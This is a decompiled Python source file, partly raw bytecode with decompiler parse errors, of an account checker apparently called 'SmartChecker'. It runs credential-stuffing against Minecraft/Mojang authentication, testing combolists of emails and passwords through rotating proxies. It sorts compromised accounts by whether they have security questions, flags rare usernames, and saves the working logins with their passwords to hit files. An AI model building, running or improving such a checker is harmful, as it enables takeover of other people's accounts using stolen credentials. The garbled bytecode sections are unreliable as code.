              228  LOAD_STR                 'availableProfiles'
              230  BINARY_SUBSCR    
              232  LOAD_CONST               0
              234  BINARY_SUBSCR    
              236  LOAD_STR                 'name'
              238  BINARY_SUBSCR    
              240  STORE_FAST               'username'

 L. 198       242  LOAD_FAST                'self'
              244  LOAD_ATTR                hits
              246  LOAD_METHOD              put
              248  LOAD_FAST                'line'
              250  CALL_METHOD_1         1  ''
              252  POP_TOP          

 L. 199       254  LOAD_FAST                'answer'
              256  LOAD_STR                 'accessToken'
              258  BINARY_SUBSCR    
              260  STORE_FAST               'token'

 L. 200       262  LOAD_CONST               True
              264  STORE_FAST               'dosfa'

 L. 201       266  LOAD_CONST               False
              268  STORE_FAST               'sfa'

 L. 202       270  LOAD_CONST               True
              272  STORE_FAST               'saveranked'

 L. 203       274  LOAD_STR                 'False'
              276  STORE_FAST               'securec'

 L. 204       278  LOAD_STR                 '======================================\n'
              280  LOAD_FAST                'line'
              282  FORMAT_VALUE          0  ''
              284  LOAD_STR                 '\nUsername: '
              286  LOAD_FAST                'username'
              288  FORMAT_VALUE          0  ''
              290  LOAD_STR                 '\nEmail: '
              292  LOAD_FAST                'email'
              294  FORMAT_VALUE          0  ''
              296  LOAD_STR                 '\nPassword: '
              298  LOAD_FAST                'password'
              300  FORMAT_VALUE          0  ''
              302  BUILD_STRING_8        8 
              304  STORE_FAST               'data'

 L. 210       306  LOAD_FAST                'dosfa'
          308_310  POP_JUMP_IF_FALSE   324  'to 324'

 L. 211       312  LOAD_FAST                'self'
              314  LOAD_ATTR                securedcheck
              316  LOAD_FAST                'token'
              318  LOAD_CONST               ('token',)
              320  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              322  STORE_FAST               'securec'
            324_0  COME_FROM           308  '308'

 L. 212       324  LOAD_FAST                'securec'
              326  LOAD_STR                 '[]'
              328  COMPARE_OP               ==
          330_332  POP_JUMP_IF_FALSE   392  'to 392'

 L. 213       334  LOAD_GLOBAL              Counter
              336  DUP_TOP          
              338  LOAD_ATTR                sfa
              340  LOAD_CONST               1
              342  INPLACE_ADD      
              344  ROT_TWO          
              346  STORE_ATTR               sfa

 L. 214       348  LOAD_FAST                'self'
              350  LOAD_ATTR                printing
              352  LOAD_METHOD              put

 L. 215       354  LOAD_GLOBAL              Fore
              356  LOAD_ATTR                LIGHTCYAN_EX
              358  LOAD_STR                 '[SFA] '
              360  LOAD_FAST                'line'
              362  FORMAT_VALUE          0  ''
              364  BUILD_STRING_2        2 
              366  BINARY_ADD       
              368  LOAD_GLOBAL              Fore
              370  LOAD_ATTR                WHITE
              372  BINARY_ADD       

 L. 214       374  CALL_METHOD_1         1  ''
              376  POP_TOP          

 L. 216       378  LOAD_CONST               True
              380  STORE_FAST               'sfa'

 L. 217       382  LOAD_FAST                'data'
              384  LOAD_STR                 '\nUnsecured: True'
              386  INPLACE_ADD      
              388  STORE_FAST               'data'
              390  JUMP_FORWARD        448  'to 448'
            392_0  COME_FROM           330  '330'

 L. 218       392  LOAD_FAST                'securec'
              394  LOAD_STR                 'False'
              396  COMPARE_OP               ==
          398_400  POP_JUMP_IF_FALSE   404  'to 404'

 L. 219       402  JUMP_FORWARD        448  'to 448'
            404_0  COME_FROM           398  '398'

 L. 221       404  LOAD_GLOBAL              Counter
              406  DUP_TOP          
              408  LOAD_ATTR                nfa
              410  LOAD_CONST               1
              412  INPLACE_ADD      
              414  ROT_TWO          
              416  STORE_ATTR               nfa

 L. 222       418  LOAD_FAST                'self'
              420  LOAD_ATTR                printing
              422  LOAD_METHOD              put
              424  LOAD_GLOBAL              Fore
              426  LOAD_ATTR                LIGHTGREEN_EX
              428  LOAD_STR                 '[NFA] '
              430  LOAD_FAST                'line'
              432  FORMAT_VALUE          0  ''
              434  BUILD_STRING_2        2 
              436  BINARY_ADD       
              438  LOAD_GLOBAL              Fore
              440  LOAD_ATTR                WHITE
              442  BINARY_ADD       
              444  CALL_METHOD_1         1  ''
              446  POP_TOP          
            448_0  COME_FROM           402  '402'
            448_1  COME_FROM           390  '390'

 L. 223       448  LOAD_GLOBAL              Counter
              450  DUP_TOP          
              452  LOAD_ATTR                hits
              454  LOAD_CONST               1
              456  INPLACE_ADD      
              458  ROT_TWO          
              460  STORE_ATTR               hits

 L. 224       462  LOAD_FAST                'self'
              464  LOAD_METHOD              name
              466  LOAD_FAST                'username'
              468  CALL_METHOD_1         1  ''
          470_472  POP_JUMP_IF_FALSE   524  'to 524'

 L. 225       474  LOAD_GLOBAL              Counter
              476  DUP_TOP          
              478  LOAD_ATTR                special_name
              480  LOAD_CONST               1
              482  INPLACE_ADD      
              484  ROT_TWO          
              486  STORE_ATTR               special_name

 L. 226       488  LOAD_FAST                'self'
              490  LOAD_ATTR                towrite
              492  LOAD_METHOD              put
              494  LOAD_FAST                'line'
              496  FORMAT_VALUE          0  ''
              498  LOAD_STR                 ' | Username: '
              500  LOAD_FAST                'username'
              502  FORMAT_VALUE          0  ''
              504  BUILD_STRING_3        3 
              506  LOAD_STR                 'SpecialName'
              508  BUILD_LIST_2          2 
              510  CALL_METHOD_1         1  ''
              512  POP_TOP          

 L. 227       514  LOAD_FAST                'data'
              516  LOAD_STR                 '\nSpecialName: True'
              518  INPLACE_ADD      
              520  STORE_FAST               'data'
              522  JUMP_FORWARD        524  'to 524'
            524_0  COME_FROM           522  '522'
            524_1  COME_FROM           470  '470'

 L. 230       524  LOAD_FAST                'saveranked'
          526_528  POP_JUMP_IF_FALSE   572  'to 572'

 L. 231       530  LOAD_FAST                'sfa'
          532_534  POP_JUMP_IF_FALSE   554  'to 554'

 L. 232       536  LOAD_FAST                'self'
              538  LOAD_ATTR                towrite
              540  LOAD_METHOD              put
              542  LOAD_FAST                'line'
              544  LOAD_STR                 'SFA'
              546  BUILD_LIST_2          2 
              548  CALL_METHOD_1         1  ''
              550  POP_TOP          
              552  JUMP_FORWARD        570  'to 570'
            554_0  COME_FROM           532  '532'

 L. 234       554  LOAD_FAST                'self'
              556  LOAD_ATTR                towrite
              558  LOAD_METHOD              put
              560  LOAD_FAST                'line'
              562  LOAD_STR                 'NFA'
              564  BUILD_LIST_2          2 
              566  CALL_METHOD_1         1  ''
              568  POP_TOP          
            570_0  COME_FROM           552  '552'
              570  JUMP_FORWARD        572  'to 572'
            572_0  COME_FROM           570  '570'
            572_1  COME_FROM           526  '526'

 L. 238       572  LOAD_FAST                'self'
              574  LOAD_ATTR                caputer
              576  LOAD_METHOD              put
              578  LOAD_FAST                'data'
              580  CALL_METHOD_1         1  ''
              582  POP_TOP          
            584_0  COME_FROM           206  '206'
              584  POP_BLOCK        
              586  JUMP_FORWARD        702  'to 702'
            588_0  COME_FROM_FINALLY     0  '0'

 L. 239       588  DUP_TOP          
              590  LOAD_GLOBAL              Exception
              592  COMPARE_OP               exception-match
          594_596  POP_JUMP_IF_FALSE   700  'to 700'
              598  POP_TOP          
              600  STORE_FAST               'e'
              602  POP_TOP          
              604  SETUP_FINALLY       688  'to 688'

 L. 240       606  LOAD_FAST                'self'
              608  LOAD_ATTR                debug
          610_612  POP_JUMP_IF_FALSE   650  'to 650'

 L. 241       614  LOAD_FAST                'self'
              616  LOAD_ATTR                printing
              618  LOAD_METHOD              put
              620  LOAD_GLOBAL              Fore
              622  LOAD_ATTR                LIGHTRED_EX
              624  FORMAT_VALUE          0  ''
              626  LOAD_STR                 '[Error] '
              628  LOAD_FAST                'line'
              630  FORMAT_VALUE          0  ''
              632  LOAD_STR                 ' \nError: '
              634  LOAD_FAST                'e'
              636  FORMAT_VALUE          0  ''
              638  LOAD_GLOBAL              Fore
              640  LOAD_ATTR                WHITE
              642  FORMAT_VALUE          0  ''
              644  BUILD_STRING_6        6 
              646  CALL_METHOD_1         1  ''
              648  POP_TOP          
            650_0  COME_FROM           610  '610'

 L. 242       650  LOAD_FAST                'self'
              652  LOAD_ATTR                savebad
          654_656  POP_JUMP_IF_FALSE   670  'to 670'

 L. 243       658  LOAD_FAST                'self'
              660  LOAD_ATTR                bad
              662  LOAD_METHOD              put
              664  LOAD_FAST                'line'
              666  CALL_METHOD_1         1  ''
              668  POP_TOP          
            670_0  COME_FROM           654  '654'

 L. 244       670  LOAD_GLOBAL              Counter
              672  DUP_TOP          
              674  LOAD_ATTR                bad
              676  LOAD_CONST               1
              678  INPLACE_ADD      
              680  ROT_TWO          
              682  STORE_ATTR               bad
              684  POP_BLOCK        
              686  BEGIN_FINALLY    
            688_0  COME_FROM_FINALLY   604  '604'
              688  LOAD_CONST               None
              690  STORE_FAST               'e'
              692  DELETE_FAST              'e'
              694  END_FINALLY      
              696  POP_EXCEPT       
              698  JUMP_FORWARD        702  'to 702'
            700_0  COME_FROM           594  '594'
              700  END_FINALLY      
            702_0  COME_FROM           698  '698'
            702_1  COME_FROM           586  '586'

Parse error at or near `JUMP_FORWARD' instruction at offset 120

    def checkmc--- This code section failed: ---

 L. 247         0  SETUP_FINALLY       138  'to 138'

 L. 250         2  LOAD_STR                 'Minecraft'

 L. 251         4  LOAD_CONST               1

 L. 249         6  LOAD_CONST               ('name', 'version')
                8  BUILD_CONST_KEY_MAP_2     2 

 L. 253        10  LOAD_FAST                'user'

 L. 254        12  LOAD_FAST                'passw'

 L. 255        14  LOAD_STR                 'true'

 L. 248        16  LOAD_CONST               ('agent', 'username', 'password', 'requestUser')
               18  BUILD_CONST_KEY_MAP_4     4 
               20  STORE_FAST               'payload'

 L. 257        22  LOAD_GLOBAL              Checker
               24  LOAD_ATTR                Proxy
               26  LOAD_ATTR                proxy
               28  POP_JUMP_IF_TRUE     64  'to 64'

 L. 258        30  LOAD_GLOBAL              post
               32  LOAD_FAST                'self'
               34  LOAD_ATTR                mcurl
               36  LOAD_FAST                'payload'

 L. 259        38  LOAD_STR                 'Content-Type'
               40  LOAD_STR                 'application/json'
               42  BUILD_MAP_1           1 

 L. 259        44  LOAD_GLOBAL              Checker
               46  LOAD_ATTR                timeout
               48  LOAD_CONST               1000
               50  BINARY_TRUE_DIVIDE

 L. 258        52  LOAD_CONST               ('json', 'headers', 'timeout')
               54  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               56  LOAD_METHOD              json
               58  CALL_METHOD_0         0  ''
               60  STORE_FAST               'answer'
               62  JUMP_FORWARD        130  'to 130'
             64_0  COME_FROM           128  '128'
             64_1  COME_FROM           124  '124'
             64_2  COME_FROM           120  '120'
             64_3  COME_FROM           110  '110'
             64_4  COME_FROM            28  '28'

 L. 263        64  SETUP_FINALLY       112  'to 112'

 L. 264        66  LOAD_GLOBAL              post
               68  LOAD_FAST                'self'
               70  LOAD_ATTR                mcurl
               72  LOAD_FAST                'self'
               74  LOAD_METHOD              proxies
               76  CALL_METHOD_0         0  ''

 L. 265        78  LOAD_FAST                'payload'

 L. 266        80  LOAD_STR                 'Content-Type'
               82  LOAD_STR                 'application/json'
               84  BUILD_MAP_1           1 

 L. 267        86  LOAD_GLOBAL              Checker
               88  LOAD_ATTR                timeout
               90  LOAD_CONST               1000
               92  BINARY_TRUE_DIVIDE

 L. 264        94  LOAD_CONST               ('proxies', 'json', 'headers', 'timeout')
               96  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
               98  LOAD_METHOD              json
              100  CALL_METHOD_0         0  ''
              102  STORE_FAST               'answer'

 L. 268       104  POP_BLOCK        
              106  BREAK_LOOP          130  'to 130'
              108  POP_BLOCK        
              110  JUMP_BACK            64  'to 64'
            112_0  COME_FROM_FINALLY    64  '64'

 L. 269       112  POP_TOP          
              114  POP_TOP          
              116  POP_TOP          

 L. 270       118  POP_EXCEPT       
              120  JUMP_BACK            64  'to 64'
              122  POP_EXCEPT       
              124  JUMP_BACK            64  'to 64'
              126  END_FINALLY      
              128  JUMP_BACK            64  'to 64'
            130_0  COME_FROM           106  '106'
            130_1  COME_FROM            62  '62'

 L. 271       130  LOAD_FAST                'answer'
              132  STORE_FAST               'answered'
              134  POP_BLOCK        
              136  JUMP_FORWARD        200  'to 200'
            138_0  COME_FROM_FINALLY     0  '0'

 L. 272       138  DUP_TOP          
              140  LOAD_GLOBAL              Exception
              142  COMPARE_OP               exception-match
              144  POP_JUMP_IF_FALSE   198  'to 198'
              146  POP_TOP          
              148  STORE_FAST               'e'
              150  POP_TOP          
              152  SETUP_FINALLY       186  'to 186'

 L. 273       154  LOAD_FAST                'self'
              156  LOAD_ATTR                debug
              158  POP_JUMP_IF_FALSE   178  'to 178'

 L. 274       160  LOAD_FAST                'self'
              162  LOAD_ATTR                printing
              164  LOAD_METHOD              put
              166  LOAD_STR                 'CheckMC: \n'
              168  LOAD_FAST                'e'
              170  FORMAT_VALUE          0  ''
              172  BUILD_STRING_2        2 
              174  CALL_METHOD_1         1  ''
              176  POP_TOP          
            178_0  COME_FROM           158  '158'

 L. 275       178  LOAD_STR                 'errorMessage'
              180  STORE_FAST               'answered'
              182  POP_BLOCK        
              184  BEGIN_FINALLY    
            186_0  COME_FROM_FINALLY   152  '152'
              186  LOAD_CONST               None
              188  STORE_FAST               'e'
              190  DELETE_FAST              'e'
              192  END_FINALLY      
              194  POP_EXCEPT       
              196  JUMP_FORWARD        200  'to 200'
            198_0  COME_FROM           144  '144'
              198  END_FINALLY      
            200_0  COME_FROM           196  '196'
            200_1  COME_FROM           136  '136'

 L. 276       200  LOAD_FAST                'answered'
              202  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `JUMP_BACK' instruction at offset 120

    def securedcheck--- This code section failed: ---

 L. 279         0  SETUP_FINALLY        72  'to 72'
              2_0  COME_FROM            62  '62'
              2_1  COME_FROM            58  '58'
              2_2  COME_FROM            54  '54'
              2_3  COME_FROM            44  '44'

 L. 281         2  SETUP_FINALLY        46  'to 46'

 L. 282         4  LOAD_GLOBAL              get
                6  LOAD_FAST                'self'
                8  LOAD_ATTR                secureurl

 L. 283        10  LOAD_STR                 'Authorization'
               12  LOAD_STR                 'Bearer '
               14  LOAD_FAST                'token'
               16  FORMAT_VALUE          0  ''
               18  BUILD_STRING_2        2 
               20  BUILD_MAP_1           1 

 L. 283        22  LOAD_FAST                'self'
               24  LOAD_METHOD              proxies
               26  CALL_METHOD_0         0  ''

 L. 283        28  LOAD_CONST               8

 L. 282        30  LOAD_CONST               ('headers', 'proxies', 'timeout')
               32  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               34  LOAD_ATTR                text
               36  STORE_FAST               'lol'

 L. 284        38  POP_BLOCK        
               40  BREAK_LOOP           64  'to 64'
               42  POP_BLOCK        
               44  JUMP_BACK             2  'to 2'
             46_0  COME_FROM_FINALLY     2  '2'

 L. 285        46  POP_TOP          
               48  POP_TOP          
               50  POP_TOP          

 L. 286        52  POP_EXCEPT       
               54  JUMP_BACK             2  'to 2'
               56  POP_EXCEPT       
               58  JUMP_BACK             2  'to 2'
               60  END_FINALLY      
               62  JUMP_BACK             2  'to 2'
             64_0  COME_FROM            40  '40'

 L. 287        64  LOAD_FAST                'lol'
               66  STORE_FAST               'answer'
               68  POP_BLOCK        
               70  JUMP_FORWARD        134  'to 134'
             72_0  COME_FROM_FINALLY     0  '0'

 L. 288        72  DUP_TOP          
               74  LOAD_GLOBAL              Exception
               76  COMPARE_OP               exception-match
               78  POP_JUMP_IF_FALSE   132  'to 132'
               80  POP_TOP          
               82  STORE_FAST               'e'
               84  POP_TOP          
               86  SETUP_FINALLY       120  'to 120'

 L. 289        88  LOAD_FAST                'self'
               90  LOAD_ATTR                debug
               92  POP_JUMP_IF_FALSE   112  'to 112'

 L. 290        94  LOAD_FAST                'self'
               96  LOAD_ATTR                printing
               98  LOAD_METHOD              put
              100  LOAD_STR                 'Error SFA: \n'
              102  LOAD_FAST                'e'
              104  FORMAT_VALUE          0  ''
              106  BUILD_STRING_2        2 
              108  CALL_METHOD_1         1  ''
              110  POP_TOP          
            112_0  COME_FROM            92  '92'

 L. 291       112  LOAD_STR                 'NFAAAA'
              114  STORE_FAST               'answer'
              116  POP_BLOCK        
              118  BEGIN_FINALLY    
            120_0  COME_FROM_FINALLY    86  '86'
              120  LOAD_CONST               None
              122  STORE_FAST               'e'
              124  DELETE_FAST              'e'
              126  END_FINALLY      
              128  POP_EXCEPT       
              130  JUMP_FORWARD        134  'to 134'
            132_0  COME_FROM            78  '78'
              132  END_FINALLY      
            134_0  COME_FROM           130  '130'
            134_1  COME_FROM            70  '70'

 L. 292       134  LOAD_FAST                'answer'
              136  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `JUMP_BACK' instruction at offset 54

    def tite(self):
        while True:
            if self.stop:
                windll.kernel32.SetConsoleTitleW(f"SmartChecker {self.version} | by patko250705#8211 | Hits: {Counter.hits} | Bad: {Counter.bad} | NFA: {Counter.nfa} | SFA: {Counter.sfa} | CPM: {Counter.cpm} | Remaining: {len(self.combolist) - (Counter.hits + Counter.bad)} | Status: Checking...")
                sleep(0.01)

    def prints(self):
        while self.stop:
            while True:
                if self.printing.qsize != 0:
                    print(self.printing.get)
                    sleep(0.01)

    def proxies(self):
        proxy = choice(self.proxys)
        proxy_form = {}
        if proxy.count(':') == 3:
            spl = proxy.split(':')
            proxy = f"{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}"
        else:
            proxy = proxy
        if self.proxy_type == 'http' or self.proxy_type == 'https':
            proxy_form = {'http':f"http://{proxy}",  'https':f"https://{proxy}"}
        else:
            if self.proxy_type == 'socks5' or (self.proxy_type == 'socks4'):
                proxy_form = {'http':f"{self.proxy_type}://{proxy}",  'https':f"{self.proxy_type}://{proxy}"}
        return proxy_form

    def writing--- This code section failed: ---
              0_0  COME_FROM            74  '74'
              0_1  COME_FROM            72  '72'
              0_2  COME_FROM            12  '12'

 L. 334         0  LOAD_FAST                'self'
                2  LOAD_ATTR                towrite
                4  LOAD_METHOD              qsize
                6  CALL_METHOD_0         0  ''
                8  LOAD_CONST               0
               10  COMPARE_OP               !=
               12  POP_JUMP_IF_FALSE_BACK     0  'to 0'

 L. 335        14  LOAD_FAST                'self'
               16  LOAD_ATTR                towrite
               18  LOAD_METHOD              get
               20  CALL_METHOD_0         0  ''
               22  STORE_FAST               'z'

 L. 336        24  LOAD_GLOBAL              open
               26  LOAD_FAST                'self'
               28  LOAD_ATTR                folder
               30  FORMAT_VALUE          0  ''
               32  LOAD_STR                 '/'
               34  LOAD_FAST                'z'
               36  LOAD_CONST               1
               38  BINARY_SUBSCR    
               40  FORMAT_VALUE          0  ''
               42  LOAD_STR                 '.txt'
               44  BUILD_STRING_4        4 
               46  LOAD_STR                 'a'
               48  LOAD_STR                 'u8'
               50  LOAD_CONST               ('encoding',)
               52  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               54  LOAD_METHOD              write
               56  LOAD_FAST                'z'
               58  LOAD_CONST               0
               60  BINARY_SUBSCR    
               62  FORMAT_VALUE          0  ''
               64  LOAD_STR                 '\n'
               66  BUILD_STRING_2        2 
               68  CALL_METHOD_1         1  ''
               70  POP_TOP          
               72  BREAK_LOOP            0  'to 0'
               74  JUMP_BACK             0  'to 0'

Parse error at or near `BREAK_LOOP' instruction at offset 72

    def save_bad--- This code section failed: ---
              0_0  COME_FROM            72  '72'
              0_1  COME_FROM            70  '70'
              0_2  COME_FROM            12  '12'

 L. 340         0  LOAD_FAST                'self'
                2  LOAD_ATTR                bad
                4  LOAD_METHOD              qsize
                6  CALL_METHOD_0         0  ''
                8  LOAD_CONST               0
               10  COMPARE_OP               !=
               12  POP_JUMP_IF_FALSE_BACK     0  'to 0'

 L. 341        14  LOAD_GLOBAL              open
               16  LOAD_FAST                'self'
               18  LOAD_ATTR                folder
               20  FORMAT_VALUE          0  ''
               22  LOAD_STR                 '/Bad.txt'
               24  BUILD_STRING_2        2 
               26  LOAD_STR                 'a'
               28  LOAD_STR                 'u8'
               30  LOAD_CONST               ('encoding',)
               32  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               34  SETUP_WITH           64  'to 64'
               36  STORE_FAST               'bad'

 L. 342        38  LOAD_FAST                'bad'
               40  LOAD_METHOD              write
               42  LOAD_FAST                'self'
               44  LOAD_ATTR                bad
               46  LOAD_METHOD              get
               48  CALL_METHOD_0         0  ''
               50  FORMAT_VALUE          0  ''
               52  LOAD_STR                 '\n'
               54  BUILD_STRING_2        2 
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          
               60  POP_BLOCK        
               62  BEGIN_FINALLY    
             64_0  COME_FROM_WITH       34  '34'
               64  WITH_CLEANUP_START
               66  WITH_CLEANUP_FINISH
               68  END_FINALLY      
               70  CONTINUE              0  'to 0'
               72  JUMP_BACK             0  'to 0'

Parse error at or near `CONTINUE' instruction at offset 70

    def cpm--- This code section failed: ---
              0_0  COME_FROM            60  '60'
              0_1  COME_FROM            58  '58'
              0_2  COME_FROM            14  '14'

 L. 346         0  LOAD_GLOBAL              Counter
                2  LOAD_ATTR                hits
                4  LOAD_GLOBAL              Counter
                6  LOAD_ATTR                bad
                8  BINARY_ADD       
               10  LOAD_CONST               1
               12  COMPARE_OP               >=
               14  POP_JUMP_IF_FALSE_BACK     0  'to 0'

 L. 347        16  LOAD_GLOBAL              Counter
               18  LOAD_ATTR                hits
               20  LOAD_GLOBAL              Counter
               22  LOAD_ATTR                bad
               24  BINARY_ADD       
               26  STORE_FAST               'now'

 L. 348        28  LOAD_GLOBAL              sleep
               30  LOAD_CONST               3
               32  CALL_FUNCTION_1       1  ''
               34  POP_TOP          

 L. 349        36  LOAD_GLOBAL              Counter
               38  LOAD_ATTR                hits
               40  LOAD_GLOBAL              Counter
               42  LOAD_ATTR                bad
               44  BINARY_ADD       
               46  LOAD_FAST                'now'
               48  BINARY_SUBTRACT  
               50  LOAD_CONST               20
               52  BINARY_MULTIPLY  
               54  LOAD_GLOBAL              Counter
               56  STORE_ATTR               cpm
               58  CONTINUE              0  'to 0'
               60  JUMP_BACK             0  'to 0'

Parse error at or near `CONTINUE' instruction at offset 58

    def save_hits--- This code section failed: ---
              0_0  COME_FROM            72  '72'
              0_1  COME_FROM            70  '70'
              0_2  COME_FROM            12  '12'

 L. 353         0  LOAD_FAST                'self'
                2  LOAD_ATTR                hits
                4  LOAD_METHOD              qsize
                6  CALL_METHOD_0         0  ''
                8  LOAD_CONST               0
               10  COMPARE_OP               !=
               12  POP_JUMP_IF_FALSE_BACK     0  'to 0'

 L. 354        14  LOAD_GLOBAL              open
               16  LOAD_FAST                'self'
               18  LOAD_ATTR                folder
               20  FORMAT_VALUE          0  ''
               22  LOAD_STR                 '/Hits.txt'
               24  BUILD_STRING_2        2 
               26  LOAD_STR                 'a'
               28  LOAD_STR                 'u8'
               30  LOAD_CONST               ('encoding',)
               32  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               34  SETUP_WITH           64  'to 64'
               36  STORE_FAST               'bad'

 L. 355        38  LOAD_FAST                'bad'
               40  LOAD_METHOD              write
               42  LOAD_FAST                'self'
               44  LOAD_ATTR                hits
               46  LOAD_METHOD              get
               48  CALL_METHOD_0         0  ''
               50  FORMAT_VALUE          0  ''
               52  LOAD_STR                 '\n'
               54  BUILD_STRING_2        2 
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          
               60  POP_BLOCK        
               62  BEGIN_FINALLY    
             64_0  COME_FROM_WITH       34  '34'
               64  WITH_CLEANUP_START
               66  WITH_CLEANUP_FINISH
               68  END_FINALLY      
               70  CONTINUE              0  'to 0'
               72  JUMP_BACK             0  'to 0'

Parse error at or near `CONTINUE' instruction at offset 70

    def name(self, name):
        if len(name) <= 3 or (name in self.dictorary):
            return True
        return False


class Checker:
    retries = int(config['checker']['retries'])
    timeout = int(config['checker']['timeout'])
    threads = int(config['checker']['threads'])
    save_bad = bool(config['checker']['save_bad'])
    print_bad = bool(config['checker']['print_bad'])
    debug = bool(config['checker']['debugging'])

    class Proxy:
        proxy = bool(config['checker']['proxy']['proxy'])
        proxylist = str(config['checker']['proxy'])
        type = str(config['checker']['proxy']['proxy_type'])


if __name__ == '__main__':
    Main()